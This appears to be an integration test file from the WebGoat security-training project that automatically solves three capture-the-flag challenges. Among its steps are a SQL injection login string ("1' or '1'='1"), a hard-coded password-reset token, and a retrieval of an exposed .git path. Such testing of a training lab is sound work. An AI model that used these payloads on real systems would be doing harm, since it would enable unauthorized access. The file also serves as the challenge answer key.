/*
 * SPDX-FileCopyrightText: Copyright © 2022 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.integration

import io.restassured.RestAssured
import org.assertj.core.api.Assertions.assertThat
import org.junit.jupiter.api.Test
import org.springframework.http.HttpStatus

class ChallengeIntegrationTest : IntegrationTest() {
    @Test
    fun testChallenge1() {
        startLesson("Challenge1")

        val resultBytes =
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", webGoatCookie)
                .get(webGoatUrlConfig.url("challenge/logo"))
                .then()
                .statusCode(200)
                .extract()
                .asByteArray()

        val pincode = String(resultBytes.copyOfRange(81216, 81220))
        val params = mutableMapOf<String, Any>()
        params["username"] = "admin"
        params["password"] = "!!webgoat_admin_1234!!".replace("1234", pincode)

        checkAssignment(webGoatUrlConfig.url("challenge/1"), params, true)
        val result =
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", webGoatCookie)
                .formParams(params)
                .post(webGoatUrlConfig.url("challenge/1"))
                .then()
                .statusCode(200)
                .extract()
                .asString()

        val flag = result.substring(result.indexOf("flag") + 6, result.indexOf("flag") + 42)
        params.clear()
        params["flag"] = flag
        checkAssignment(webGoatUrlConfig.url("challenge/flag/1"), params, true)

        checkResults("Challenge1")
    }

    @Test
    fun testChallenge5() {
        startLesson("Challenge5")

        val params = mutableMapOf<String, Any>()
        params["username_login"] = "Larry"
        params["password_login"] = "1' or '1'='1"

        val result =
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", webGoatCookie)
                .formParams(params)
                .post(webGoatUrlConfig.url("challenge/5"))
                .then()
                .statusCode(200)
                .extract()
                .asString()

        val flag = result.substring(result.indexOf("flag") + 6, result.indexOf("flag") + 42)
        params.clear()
        params["flag"] = flag
        checkAssignment(webGoatUrlConfig.url("challenge/flag/5"), params, true)

        checkResults("Challenge5")
    }

    @Test
    fun testChallenge7() {
        startLesson("Challenge7")
        cleanMailbox()

        // One should first be able to download git.zip from WebGoat
        RestAssured
            .given()
            .`when`()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", webGoatCookie)
            .get(webGoatUrlConfig.url("challenge/7/.git"))
            .then()
            .statusCode(200)
            .extract()
            .asString()

        // Should email WebWolf inbox this should give a hint to the link being static
        RestAssured
            .given()
            .`when`()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", webGoatCookie)
            .formParams("email", "$user@webgoat.org")
            .post(webGoatUrlConfig.url("challenge/7"))
            .then()
            .statusCode(200)
            .extract()
            .asString()

        // Check whether email has been received
        val responseBody =
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("WEBWOLFSESSION", webWolfCookie)
                .get(webWolfUrlConfig.url("mail"))
                .then()
                .extract()
                .response()
                .body
                .asString()
        assertThat(responseBody).contains("Hi, you requested a password reset link")

        // Call reset link with admin link
        val result =
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", webGoatCookie)
                .get(
                    webGoatUrlConfig.url("challenge/7/reset-password/{link}"),
                    "375afe1104f4a487a73823c50a9292a2",
                ).then()
                .statusCode(HttpStatus.ACCEPTED.value())
                .extract()
                .asString()

        val flag = result.substring(result.indexOf("flag") + 6, result.indexOf("flag") + 42)
        checkAssignment(webGoatUrlConfig.url("challenge/flag/7"), mapOf("flag" to flag), true)
    }
}
